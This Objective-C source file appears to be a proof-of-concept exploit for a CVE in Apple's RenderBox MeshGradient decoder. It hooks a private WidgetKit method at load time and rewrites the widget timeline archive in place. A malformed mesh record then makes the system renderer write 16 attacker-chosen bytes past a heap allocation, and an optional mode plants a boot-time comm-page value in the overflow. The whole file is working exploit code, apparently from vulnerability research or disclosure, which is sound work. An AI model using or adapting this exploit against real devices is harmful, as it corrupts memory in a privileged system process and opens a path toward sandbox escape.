//
//  ArchiveInterceptor.m
//  MeshGradientOOB
//
//  PoC for CVE-2026-112691: controlled heap OOB write in
//  RB::Fill::MeshGradient::decode, reached from the widget extension through
//  the production WidgetKit timeline path.
//
//  How this file works:
//
//  WidgetKit hands the extension a TimelineRequest whose `fileHandle` ivar
//  names a promise-owned Chrono archive. The system process
//  WidgetRenderer_Default decodes that archive later, outside the extension.
//  This interceptor swaps the request's file handle for a temporary file,
//  lets the normal archiver write the genuine archive there, rewrites the
//  archive in place (same length), and returns the original completion. The
//  system renderer therefore decodes bytes chosen by this code.
//
//  Rewrite modes (compile-time flags):
//
//    default            Safe control. A text sentinel becomes a same-length
//                       marker string. No memory-safety effect; the widget
//                       renders the marker.
//    MGOOB_POSITIVE=1   The archived 2x2 MeshGradient record becomes a
//                       malformed type 6 record with 5 color qwords. RenderBox
//                       sizes the destination from floor(5/3)=1 element
//                       (3 color qwords) but copies all 5, writing the last
//                       two qwords 8..16 bytes past the allocation.
//    MGOOB_ASB_TARGET=1 With positive mode: the second overflow qword is the
//                       current boot's _COMM_PAGE_ASB_TARGET_VALUE, so crash
//                       reports show the published Apple Target Flags value
//                       in a register (observed in x13).
//

#import "ArchiveInterceptor.h"

#import <fcntl.h>
#import <objc/runtime.h>
#import <os/log.h>
#import <string.h>
#import <sys/stat.h>
#import <unistd.h>

extern void objc_storeStrong(void *location, id _Nullable value);

NSString *const MGOOBControlSentinel = @"MGOOB_SENTINEL_0000000000000000";

#ifndef MGOOB_POSITIVE
#define MGOOB_POSITIVE 0
#endif
#ifndef MGOOB_ASB_TARGET
#define MGOOB_ASB_TARGET 0
#endif
#ifndef MGOOB_QWORD0
#define MGOOB_QWORD0 UINT64_C(0x3c00380034003000)
#endif
#ifndef MGOOB_QWORD1
#define MGOOB_QWORD1 UINT64_C(0x3800340030002c00)
#endif

static const BOOL MGPositive = MGOOB_POSITIVE != 0;
static const BOOL MGASBTarget = MGOOB_ASB_TARGET != 0;
static const uint64_t MGQword0 = MGOOB_QWORD0;
static const uint64_t MGQword1 = MGOOB_QWORD1;

static os_log_t MGOOBLog;

// _COMM_PAGE_ASB_TARGET_VALUE (0xFFFFC000 + 0x320): a random value selected
// at boot, published by Apple for its Target Flags procedure.
static const volatile uint64_t *const MGCommPageTargetValue =
    (const volatile uint64_t *)UINT64_C(0xfffffc320);

// One archived 2x2 MeshGradient record is exactly 70 bytes:
//   field 1 (type)   = 1 (varint)
//   field 2 (points) = 32 bytes: four (x, y) float pairs
//   field 3 (colors) = 32 bytes: four fixed64 qwords
// The first 38 bytes below are the search needle; the four color qwords
// follow in the archive and are not part of the needle.
static const uint8_t MGControlRecord[38] = {
    0x08, 0x01, 0x12, 0x20,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // (0, 0)
    0x00, 0x00, 0x80, 0x3f, 0x00, 0x00, 0x00, 0x00,  // (1, 0)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3f,  // (0, 1)
    0x00, 0x00, 0x80, 0x3f, 0x00, 0x00, 0x80, 0x3f,  // (1, 1)
    0x1a, 0x20,
};

// The malformed replacement record keeps the exact 70-byte length:
//   field 1 (type)   = 6
//   field 2 (points) = 24 bytes: three (x, y) float pairs
//   field 3 (colors) = 40 bytes: FIVE fixed64 qwords
// E = floor(5 / 3) = 1 element, so the destination color span holds three
// qwords while the copy writes five. The last two qwords (patched at runtime)
// land 8 and 16 bytes past the end of the MeshGradient::Data allocation, and
// every bit of them comes from this archive.
static uint8_t MGMalformedRecord[70] = {
    0x08, 0x06, 0x12, 0x18,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // (0, 0)
    0x00, 0x00, 0x80, 0x3f, 0x00, 0x00, 0x00, 0x00,  // (1, 0)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3f,  // (0, 1)
    0x1a, 0x28,
    0x00, 0x3c, 0x00, 0x3c, 0x00, 0x3c, 0x00, 0x3c,  // color qword 1
    0x00, 0x3c, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x00,  // color qword 2
    0x00, 0x00, 0x3c, 0x00, 0x00, 0x00, 0x3c, 0x00,  // color qword 3
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // overflow qword 0
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // overflow qword 1
};
static const NSUInteger MGOverflowOffset = 70 - sizeof(uint64_t) * 2;

typedef void (^MGCompletion)(id _Nullable response);
typedef void (*MGOriginalImplementation)(id receiver,
                                         SEL selector,
                                         NSArray<id> *requests,
                                         BOOL isPreview,
                                         MGCompletion completion);

static MGOriginalImplementation MGOriginal;
static Ivar MGFileHandleIvar;

#pragma mark - File helpers

static NSData *_Nullable MGReadWholeFile(int descriptor) {
    struct stat status = {0};
    if (fstat(descriptor, &status) != 0 || status.st_size <= 0) {
        return nil;
    }
    NSMutableData *bytes = [NSMutableData dataWithLength:(NSUInteger)status.st_size];
    size_t total = 0;
    while (total < (size_t)status.st_size) {
        ssize_t readCount = pread(descriptor,
                                  (uint8_t *)bytes.mutableBytes + total,
                                  (size_t)status.st_size - total,
                                  (off_t)total);
        if (readCount > 0) {
            total += (size_t)readCount;
            continue;
        }
        if (readCount < 0 && errno == EINTR) {
            continue;
        }
        return nil;
    }
    return bytes;
}

static BOOL MGWriteWholeFile(int descriptor, NSData *bytes) {
    if (ftruncate(descriptor, 0) != 0) {
        return NO;
    }
    size_t total = 0;
    while (total < bytes.length) {
        ssize_t writeCount = pwrite(descriptor,
                                    (const uint8_t *)bytes.bytes + total,
                                    bytes.length - total,
                                    (off_t)total);
        if (writeCount > 0) {
            total += (size_t)writeCount;
            continue;
        }
        if (writeCount < 0 && errno == EINTR) {
            continue;
        }
        return NO;
    }
    return fsync(descriptor) == 0;
}

#pragma mark - Archive rewrite

// Replaces every occurrence of `needle` with `replacement`. `replacement`
// may be longer than `needle`; each match must still have room for it. The
// total length only stays constant when the caller keeps the record sizes
// equal, which both modes below do.
static NSUInteger MGReplaceAll(NSMutableData *archive, NSData *needle, NSData *replacement) {
    NSUInteger count = 0;
    NSUInteger offset = 0;
    while (offset + needle.length <= archive.length) {
        NSRange match = [archive rangeOfData:needle
                                      options:0
                                        range:NSMakeRange(offset, archive.length - offset)];
        if (match.location == NSNotFound) {
            break;
        }
        if (match.location + replacement.length > archive.length) {
            break;
        }
        [archive replaceBytesInRange:NSMakeRange(match.location, replacement.length)
                            withBytes:replacement.bytes
                               length:replacement.length];
        offset = match.location + replacement.length;
        count += 1;
    }
    return count;
}

static NSData *_Nullable MGRewriteArchive(NSData *archive) {
    NSMutableData *candidate = archive.mutableCopy;

    if (MGPositive) {
        uint64_t overflow[2] = {MGQword0, MGQword1};
        if (MGASBTarget) {
            overflow[1] = *MGCommPageTargetValue;
        }
        memcpy(&MGMalformedRecord[MGOverflowOffset], overflow, sizeof(overflow));

        NSData *needle = [NSData dataWithBytes:MGControlRecord length:sizeof(MGControlRecord)];
        NSData *replacement = [NSData dataWithBytes:MGMalformedRecord length:sizeof(MGMalformedRecord)];
        NSUInteger count = MGReplaceAll(candidate, needle, replacement);
        if (count == 0) {
            os_log_error(MGOOBLog, "MGOOB_FAILED reason=no-mesh-record size=%lu",
                         (unsigned long)archive.length);
            return nil;
        }
        os_log_info(MGOOBLog,
                    "MGOOB_RESULT OOB_PAYLOAD_WRITTEN size=%lu records=%lu "
                    "qword0=0x%016llx qword1=0x%016llx asbTarget=%d",
                    (unsigned long)candidate.length,
                    (unsigned long)count,
                    (unsigned long long)overflow[0],
                    (unsigned long long)overflow[1],
                    MGASBTarget);
        return candidate;
    }

    // Safe control: same-length text replacement, no memory-safety effect.
    NSData *sentinel = [MGOOBControlSentinel dataUsingEncoding:NSUTF8StringEncoding];
    NSString *marker = [NSString stringWithFormat:@"MGOOB_SAFE_MARKER_%08X",
                        (unsigned int)getpid()];
    while (marker.length < MGOOBControlSentinel.length) {
        marker = [marker stringByAppendingString:@"_"];
    }
    NSData *markerData = [marker dataUsingEncoding:NSUTF8StringEncoding];
    NSUInteger count = MGReplaceAll(candidate, sentinel, markerData);
    if (count == 0) {
        os_log_error(MGOOBLog, "MGOOB_FAILED reason=no-sentinel size=%lu",
                     (unsigned long)archive.length);
        return nil;
    }
    os_log_info(MGOOBLog, "MGOOB_RESULT MARKER_WRITTEN size=%lu occurrences=%lu",
                (unsigned long)candidate.length,
                (unsigned long)count);
    return candidate;
}

#pragma mark - One captured timeline request

@interface MGCapturedRequest : NSObject

@property(nonatomic, readonly) int originalDescriptor;
@property(nonatomic, strong, readonly) NSFileHandle *redirectHandle;

- (nullable instancetype)initWithFileHandle:(NSFileHandle *)fileHandle;
- (void)commitRewrittenArchive;
- (void)closeDescriptors;

@end

@implementation MGCapturedRequest {
    int _redirectDescriptor;
    NSString *_redirectPath;
}

- (nullable instancetype)initWithFileHandle:(NSFileHandle *)fileHandle {
    self = [super init];
    if (self == nil) {
        return nil;
    }

    _originalDescriptor = fcntl(fileHandle.fileDescriptor, F_DUPFD_CLOEXEC, 0);

    char pathTemplate[PATH_MAX] = {0};
    snprintf(pathTemplate, sizeof(pathTemplate), "%s/mgoob-archive-XXXXXX",
             NSTemporaryDirectory().fileSystemRepresentation);
    int redirectWriter = mkstemp(pathTemplate);
    _redirectDescriptor = redirectWriter < 0 ? -1 : fcntl(redirectWriter, F_DUPFD_CLOEXEC, 0);
    _redirectPath = redirectWriter < 0 ? nil : [NSString stringWithUTF8String:pathTemplate];
    _redirectHandle = redirectWriter < 0
        ? nil
        : [[NSFileHandle alloc] initWithFileDescriptor:redirectWriter closeOnDealloc:YES];

    if (_originalDescriptor < 0 || _redirectDescriptor < 0 || _redirectHandle == nil) {
        os_log_error(MGOOBLog, "MGOOB_FAILED reason=capture");
        [self closeDescriptors];
        return nil;
    }
    return self;
}

- (void)dealloc {
    [self closeDescriptors];
}

- (void)closeDescriptors {
    if (_originalDescriptor >= 0) {
        close(_originalDescriptor);
        _originalDescriptor = -1;
    }
    if (_redirectDescriptor >= 0) {
        close(_redirectDescriptor);
        _redirectDescriptor = -1;
    }
    if (_redirectPath.length > 0) {
        unlink(_redirectPath.fileSystemRepresentation);
        _redirectPath = nil;
    }
}

// The normal archiver has finished writing into the redirect file. Read the
// genuine archive, rewrite it, and commit the result to the original
// promise-owned descriptor that the system renderer will decode.
- (void)commitRewrittenArchive {
    NSData *redirected = MGReadWholeFile(_redirectDescriptor);
    NSData *candidate = redirected == nil ? nil : MGRewriteArchive(redirected);
    if (candidate == nil || !MGWriteWholeFile(self.originalDescriptor, candidate)) {
        os_log_error(MGOOBLog, "MGOOB_FAILED reason=commit");
    }
}

@end

#pragma mark - Receiver interposition

static void MGInterceptedReceiver(id receiver,
                                  SEL selector,
                                  NSArray<id> *requests,
                                  BOOL isPreview,
                                  MGCompletion completion) {
    NSMutableArray<MGCapturedRequest *> *captures = [NSMutableArray array];

    for (id request in requests) {
        NSFileHandle *fileHandle = object_getIvar(request, MGFileHandleIvar);
        MGCapturedRequest *capture = [[MGCapturedRequest alloc] initWithFileHandle:fileHandle];
        if (capture == nil) {
            continue;
        }
        // TimelineRequest is a Swift class, so object_setIvar cannot express
        // the strong ownership of this ivar. Store through the raw slot.
        void *fileHandleSlot = (uint8_t *)(__bridge void *)request
            + ivar_getOffset(MGFileHandleIvar);
        objc_storeStrong(fileHandleSlot, capture.redirectHandle);
        [captures addObject:capture];
    }

    MGOriginal(receiver, selector, requests, isPreview, ^(id response) {
        for (MGCapturedRequest *capture in captures) {
            [capture commitRewrittenArchive];
            [capture closeDescriptors];
        }
        completion(response);
    });
}

static void MGInstallInterceptor(void) {
    MGOOBLog = os_log_create("com.licht.meshgradientoob.widget", "archive-ingress");

    Class receiverClass = objc_getClass("_TtCC9WidgetKit24WidgetExtensionXPCServer14ExportedObject");
    Class requestClass = objc_getClass("_TtC9WidgetKit15TimelineRequest");
    SEL selector = NSSelectorFromString(@"getTimelinesWithRequests:isPreview:completion:");
    Method method = receiverClass == Nil ? NULL
                                         : class_getInstanceMethod(receiverClass, selector);
    MGFileHandleIvar = requestClass == Nil ? NULL
                                           : class_getInstanceVariable(requestClass, "fileHandle");

    if (method == NULL || MGFileHandleIvar == NULL) {
        os_log_error(MGOOBLog, "MGOOB_FAILED reason=private-shape-changed");
        return;
    }

    MGOriginal = (MGOriginalImplementation)method_setImplementation(method,
                                                                    (IMP)MGInterceptedReceiver);
    if (MGOriginal == NULL) {
        os_log_error(MGOOBLog, "MGOOB_FAILED reason=install");
        return;
    }

    os_log_info(MGOOBLog,
                "MGOOB_INSTALLED build=%{public}@ fileHandleOffset=%lld positive=%d asbTarget=%d",
                [[NSProcessInfo processInfo] operatingSystemVersionString],
                (long long)ivar_getOffset(MGFileHandleIvar),
                MGPositive,
                MGASBTarget);
}

@interface MGOOBBootstrap : NSObject
@end

@implementation MGOOBBootstrap

+ (void)load {
    MGInstallInterceptor();
}

@end
